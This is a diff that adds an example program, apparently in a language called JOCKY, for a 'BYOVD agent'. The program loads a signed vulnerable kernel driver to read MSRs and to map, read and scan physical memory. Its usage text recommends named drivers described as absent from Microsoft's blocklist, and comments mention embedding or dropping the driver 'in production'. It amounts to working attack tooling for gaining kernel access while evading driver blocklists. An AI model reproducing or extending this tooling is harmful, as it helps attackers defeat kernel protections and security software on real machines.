@@ -1,0 +1,101 @@
+/*
+ * BYOVD Agent - JOCKY Example
+ *
+ * Demonstrates using the BYOVD runtime to perform
+ * kernel-level operations via a signed vulnerable driver.
+ *
+ * Compile with: jockyc byovd_agent.jky -o byovd_agent.exe --target x86_64-w64-mingw32
+ */
+
+// This script uses FFI to call the BYOVD runtime C functions
+
+extern "C" {
+    // BYOVD runtime functions (from byovd_modular.h)
+    // These are linked automatically when --byovd is passed to jockyc
+    fn byovd_init(driverPath: *wchar) -> *void;
+    fn byovd_shutdown(ctx: *void);
+    fn byovd_map_physical(ctx: *void, physAddr: u64, size: u32, virtAddr: **void) -> bool;
+    fn byovd_unmap_physical(ctx: *void, virtAddr: *void) -> bool;
+    fn byovd_read_phys(ctx: *void, physAddr: u64, buffer: *void, size: u32) -> bool;
+    fn byovd_write_phys(ctx: *void, physAddr: u64, buffer: *void, size: u32) -> bool;
+    fn byovd_read_msr(ctx: *void, msrIndex: u32, value: *u64) -> bool;
+    fn byovd_scan_phys(ctx: *void, start: u64, end: u64, pattern: *u8, patLen: u32, found: *u64) -> bool;
+    fn byovd_is_active(ctx: *void) -> bool;
+}
+
+fn main() -> int {
+    print("JOCKY BYOVD Agent v1.0");
+    print("========================");
+    print("");
+
+    // The driver path is passed as the first argument
+    // In production, the driver would be embedded or dropped
+    let driverPath = argv[1];
+    if driverPath == "" {
+        print("Usage: byovd_agent.exe <driver.sys>");
+        print("");
+        print("Recommended drivers (not on Microsoft blocklist):");
+        print("  AMDRyzenMasterDriver.sys  - AMD gaming systems");
+        print("  rtkiow10x64.sys           - Realtek audio (every laptop)");
+        print("  iQVW64.SYS                - Intel system tools");
+        print("  nvflsh64.sys              - NVIDIA GPU systems");
+        return 1;
+    }
+
+    print("[*] Loading vulnerable driver...");
+    let ctx = byovd_init(driverPath);
+
+    if ctx == null {
+        print("[!] Failed to load driver. Ensure:");
+        print("    1. Running as Administrator");
+        print("    2. Driver file exists and is signed");
+        print("    3. Test signing or HVCI is disabled");
+        return 1;
+    }
+
+    print("[+] Driver loaded and IOCTL interface discovered");
+
+    if !byovd_is_active(ctx) {
+        print("[!] BYOVD context is not active");
+        byovd_shutdown(ctx);
+        return 1;
+    }
+
+    print("[*] Reading MSR 0x1B (IA32_APIC_BASE)...");
+    let msrValue: u64 = 0;
+    if byovd_read_msr(ctx, 0x1B, &msrValue) {
+        print("[+] MSR 0x1B = " + hex(msrValue));
+    } else {
+        print("[-] MSR read not supported by this driver");
+    }
+
+    print("[*] Mapping physical memory at 0x1000...");
+    let mapped: *void = null;
+    if byovd_map_physical(ctx, 0x1000, 4096, &mapped) {
+        print("[+] Mapped -> " + hex(mapped));
+
+        // Read first 16 bytes
+        let buf: [u8; 16];
+        memcpy(&buf, mapped, 16);
+        print("[+] First 16 bytes: " + hex_bytes(&buf, 16));
+
+        byovd_unmap_physical(ctx, mapped);
+    } else {
+        print("[-] Failed to map physical memory");
+    }
+
+    print("[*] Scanning physical memory for MZ header...");
+    let found: u64 = 0;
+    let mzPattern: [u8; 2] = [0x4D, 0x5A]; // "MZ"
+    if byovd_scan_phys(ctx, 0x100000, 0x110000, &mzPattern, 2, &found) {
+        print("[+] Found MZ header at physical address: " + hex(found));
+    } else {
+        print("[-] MZ header not found in range");
+    }
+
+    print("[*] Shutting down BYOVD...");
+    byovd_shutdown(ctx);
+    print("[+] Done.");
+
+    return 0;
+}
